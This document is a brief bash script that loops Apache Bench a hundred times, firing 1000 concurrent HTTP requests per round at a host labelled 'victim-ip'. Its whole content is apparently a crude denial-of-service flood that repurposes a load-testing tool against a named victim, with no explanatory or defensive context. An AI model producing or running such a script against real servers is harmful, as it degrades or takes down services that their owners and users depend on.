#!/bin/bash

for i in  {1..100}; do
	ab -n 1000 -c 10 http://victim-ip/
	sleep 1
done
